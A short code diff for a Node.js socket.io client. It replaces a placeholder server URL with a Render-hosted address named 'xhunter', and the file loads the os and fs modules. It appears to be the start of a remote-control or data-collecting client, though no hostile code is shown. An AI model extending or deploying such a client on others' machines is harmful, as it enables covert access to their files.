@@ -1,5 +1,5 @@
 const io = require('socket.io-client');
-const socket = io('https://YOUR_RENDER_URL'); // ضع هنا رابط السيرفر على Render
+const socket = io('https://xhunter-nd49.onrender.com'); // ضع هنا رابط السيرفر على Render
 
 const os = require('os');
 const fs = require('fs');
